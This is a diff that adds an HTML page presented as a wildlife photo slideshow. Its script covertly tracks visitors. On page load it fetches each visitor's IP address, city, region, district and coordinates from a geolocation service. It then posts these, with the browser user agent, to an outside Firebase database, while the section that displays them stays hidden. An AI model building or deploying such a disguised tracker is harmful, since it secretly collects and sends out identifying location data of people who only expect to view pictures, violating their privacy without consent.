@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wildlife Gallery</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 800px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .slideshow-container {
+            position: relative;
+            width: 100%;
+            height: 500px;
+            background: #f0f0f0;
+            overflow: hidden;
+        }
+
+        .slide {
+            display: none;
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
+            animation: fadeIn 0.8s;
+        }
+
+        .slide.active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .slide img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .slide-counter {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.6);
+            color: white;
+            padding: 10px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            z-index: 10;
+        }
+
+        .controls {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            background: #f9f9f9;
+            gap: 10px;
+        }
+
+        button {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background: #764ba2;
+        }
+
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .info-section {
+            padding: 20px;
+            background: white;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .info-section h3 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #f0f0f0;
+            font-size: 14px;
+        }
+
+        .info-item:last-child {
+            border-bottom: none;
+        }
+
+        .label {
+            color: #666;
+            font-weight: 600;
+        }
+
+        .value {
+            color: #333;
+            font-family: 'Courier New', monospace;
+        }
+
+        .status {
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 13px;
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .status.loading {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+
+        @media (max-width: 600px) {
+            .header h1 {
+                font-size: 20px;
+            }
+
+            .slideshow-container {
+                height: 300px;
+            }
+
+            .controls {
+                flex-wrap: wrap;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Wildlife Gallery</h1>
+            <p>Enjoy this beautiful collection of wildlife photography</p>
+        </div>
+
+        <div class="slideshow-container">
+            <div class="slide active">
+                <img src="https://images.pexels.com/photos/1618606/pexels-photo-1618606.jpeg?auto=compress&cs=tinysrgb&w=800" alt="African Elephant">
+            </div>
+            <div class="slide">
+                <img src="https://images.pexels.com/photos/47547/squirrel-animal-cute-eyes-47547.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Squirrel">
+            </div>
+            <div class="slide">
+                <img src="https://images.pexels.com/photos/3331217/pexels-photo-3331217.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Tiger">
+            </div>
+            <div class="slide">
+                <img src="https://images.pexels.com/photos/50581/lion-wild-africa-portrait-50581.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Lion">
+            </div>
+            <div class="slide">
+                <img src="https://images.pexels.com/photos/349758/hummingbird-bird-birds-349758.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Hummingbird">
+            </div>
+
+            <div class="slide-counter">
+                <span id="current-slide">1</span> / <span id="total-slides">5</span>
+            </div>
+        </div>
+
+        <div class="controls">
+            <button id="prev-btn" onclick="previousSlide()">← Previous</button>
+            <button id="play-btn" onclick="toggleAutoPlay()">Auto Play</button>
+            <button id="next-btn" onclick="nextSlide()">Next →</button>
+        </div>
+
+        <div class="info-section" hidden>
+            <h3>Your Information</h3>
+            <div class="info-item">
+                <span class="label">Your IP Address:</span>
+                <span class="value" id="ip-address">Detecting...</span>
+            </div>
+            <div class="info-item">
+                <span class="label">Country:</span>
+                <span class="value" id="country">-</span>
+            </div>
+            <div class="info-item">
+                <span class="label">City:</span>
+                <span class="value" id="city">-</span>
+            </div>
+            <div class="info-item">
+                <span class="label">Region:</span>
+                <span class="value" id="region">-</span>
+            </div>
+            <div class="info-item">
+                <span class="label">District:</span>
+                <span class="value" id="district">-</span>
+            </div>
+            <div class="info-item">
+                <span class="label">Latitude:</span>
+                <span class="value" id="latitude">-</span>
+            </div>
+            <div class="info-item">
+                <span class="label">Longitude:</span>
+                <span class="value" id="longitude">-</span>
+            </div>
+            <div class="info-item">
+                <span class="label">Timestamp:</span>
+                <span class="value" id="timestamp">-</span>
+            </div>
+            <div id="status" class="status loading">Retrieving your information...</div>
+        </div>
+    </div>
+
+    <script>
+        let currentSlide = 0;
+        let autoPlayActive = false;
+        let autoPlayInterval = null;
+        const slides = document.querySelectorAll('.slide');
+        const totalSlides = slides.length;
+
+        document.getElementById('total-slides').textContent = totalSlides;
+
+        function showSlide(n) {
+            slides.forEach(slide => slide.classList.remove('active'));
+            slides[n].classList.add('active');
+            document.getElementById('current-slide').textContent = n + 1;
+        }
+
+        function nextSlide() {
+            currentSlide = (currentSlide + 1) % totalSlides;
+            showSlide(currentSlide);
+        }
+
+        function previousSlide() {
+            currentSlide = (currentSlide - 1 + totalSlides) % totalSlides;
+            showSlide(currentSlide);
+        }
+
+        function toggleAutoPlay() {
+            autoPlayActive = !autoPlayActive;
+            const btn = document.getElementById('play-btn');
+
+            if (autoPlayActive) {
+                btn.textContent = 'Stop';
+                autoPlayInterval = setInterval(nextSlide, 4000);
+            } else {
+                btn.textContent = 'Auto Play';
+                clearInterval(autoPlayInterval);
+            }
+        }
+
+        async function getIPAndLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    country: data.country_name || '-',
+                    city: data.city || '-',
+                    region: data.region || '-',
+                    district: data.district || '-',
+                    latitude: data.latitude || '-',
+                    longitude: data.longitude || '-'
+                };
+            } catch (error) {
+                console.error('Error fetching IP/location:', error);
+                return {
+                    ip: 'Unable to detect',
+                    country: '-',
+                    city: '-',
+                    region: '-',
+                    district: '-',
+                    latitude: '-',
+                    longitude: '-'
+                };
+            }
+        }
+
+        async function saveIPToFirebase(data) {
+            try {
+                const timestamp = new Date().toISOString();
+                const firebaseURL = 'https://cybersecurity-c1710-default-rtdb.asia-southeast1.firebasedatabase.app/visitors.json';
+
+                const payload = {
+                    ip: data.ip,
+                    country: data.country,
+                    city: data.city,
+                    region: data.region,
+                    district: data.district,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    timestamp: timestamp,
+                    userAgent: navigator.userAgent
+                };
+
+                const response = await fetch(firebaseURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    return { success: true, timestamp };
+                } else {
+                    return { success: false, error: 'Failed to save' };
+                }
+            } catch (error) {
+                console.error('Error saving to Firebase:', error);
+                return { success: false, error: error.message };
+            }
+        }
+
+        async function initializeTracker() {
+            try {
+                const locationData = await getIPAndLocation();
+                const result = await saveIPToFirebase(locationData);
+
+                document.getElementById('ip-address').textContent = locationData.ip;
+                document.getElementById('country').textContent = locationData.country;
+                document.getElementById('city').textContent = locationData.city;
+                document.getElementById('region').textContent = locationData.region;
+                document.getElementById('district').textContent = locationData.district;
+                document.getElementById('latitude').textContent = locationData.latitude;
+                document.getElementById('longitude').textContent = locationData.longitude;
+                document.getElementById('timestamp').textContent = new Date().toLocaleString();
+
+                const statusEl = document.getElementById('status');
+                if (result.success) {
+                    statusEl.className = 'status success';
+                    statusEl.textContent = '✓ Information recorded successfully';
+                } else {
+                    statusEl.className = 'status error';
+                    statusEl.textContent = '✗ Could not save information';
+                }
+            } catch (error) {
+                console.error('Error initializing tracker:', error);
+                document.getElementById('status').className = 'status error';
+                document.getElementById('status').textContent = '✗ An error occurred';
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', initializeTracker);
+    </script>
+</body>
+</html>
